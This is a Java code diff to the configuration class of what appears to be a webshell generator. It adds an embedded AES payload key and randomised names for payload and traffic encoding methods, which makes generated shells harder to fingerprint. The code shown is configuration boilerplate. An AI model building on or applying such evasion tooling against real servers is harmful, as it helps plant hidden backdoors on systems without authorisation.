@@ -21,6 +21,8 @@ public class ShellGeneratorConfig {
     // 必需参数
     private Disguise reqDisguise;
     private Disguise respDisguise;
+    /** User supplied AES key embedded into the generated Java Core. */
+    private String payloadKey;
     
     // 可选参数
     private String coreClassName;
@@ -75,12 +77,19 @@ public class ShellGeneratorConfig {
     private String methodRedirect;
     private String methodLoadComponent;
     private String methodInvokeComponent;
+    private String methodPayloadEncode;
+    private String methodPayloadDecode;
+    private String methodTrafficEncode;
+    private String methodTrafficDecode;
+    private String methodProcessBuffer;
 
     // LeoCore 实例/静态字段随机名
     private String fieldParams;
     private String fieldResults;
     private String fieldHostId;
     private String fieldComponents;
+    private String fieldPayloadSecret;
+    private String fieldPayloadRandom;
 
     /**
      * 私有构造函数，使用Builder模式
@@ -97,11 +106,18 @@ public class ShellGeneratorConfig {
             this.methodRedirect        = ClassNameGenerator.randomMethodName(used);
             this.methodLoadComponent   = ClassNameGenerator.randomMethodName(used);
             this.methodInvokeComponent = ClassNameGenerator.randomMethodName(used);
+            this.methodPayloadEncode   = ClassNameGenerator.randomMethodName(used);
+            this.methodPayloadDecode   = ClassNameGenerator.randomMethodName(used);
+            this.methodTrafficEncode   = ClassNameGenerator.randomMethodName(used);
+            this.methodTrafficDecode   = ClassNameGenerator.randomMethodName(used);
+            this.methodProcessBuffer   = ClassNameGenerator.randomMethodName(used);
 
             this.fieldParams      = ClassNameGenerator.randomFieldName(used);
             this.fieldResults     = ClassNameGenerator.randomFieldName(used);
             this.fieldHostId      = ClassNameGenerator.randomFieldName(used);
             this.fieldComponents = ClassNameGenerator.randomFieldName(used);
+            this.fieldPayloadSecret = ClassNameGenerator.randomFieldName(used);
+            this.fieldPayloadRandom = ClassNameGenerator.randomFieldName(used);
         }
     }
     
@@ -126,6 +142,14 @@ public class ShellGeneratorConfig {
             config = new ShellGeneratorConfig();
             config.reqDisguise = reqDisguise;
             config.respDisguise = respDisguise;
+        }
+
+        public Builder payloadKey(String payloadKey) {
+            if (payloadKey == null || payloadKey.trim().isEmpty()) {
+                throw new IllegalArgumentException("payloadKey 不能为空");
+            }
+            config.payloadKey = payloadKey;
+            return this;
         }
         
         /**
@@ -347,6 +371,10 @@ public class ShellGeneratorConfig {
     public Disguise getRespDisguise() {
         return respDisguise;
     }
+
+    public String getPayloadKey() {
+        return payloadKey;
+    }
     
     public String getCoreClassName() {
         return coreClassName;
@@ -471,6 +499,16 @@ public class ShellGeneratorConfig {
         return methodInvokeComponent;
     }
 
+    public String getMethodPayloadEncode() { return methodPayloadEncode; }
+
+    public String getMethodPayloadDecode() { return methodPayloadDecode; }
+
+    public String getMethodTrafficEncode() { return methodTrafficEncode; }
+
+    public String getMethodTrafficDecode() { return methodTrafficDecode; }
+
+    public String getMethodProcessBuffer() { return methodProcessBuffer; }
+
     public String getFieldParams() {
         return fieldParams;
     }
@@ -486,5 +524,9 @@ public class ShellGeneratorConfig {
     public String getFieldComponents() {
         return fieldComponents;
     }
+
+    public String getFieldPayloadSecret() { return fieldPayloadSecret; }
+
+    public String getFieldPayloadRandom() { return fieldPayloadRandom; }
 
 }
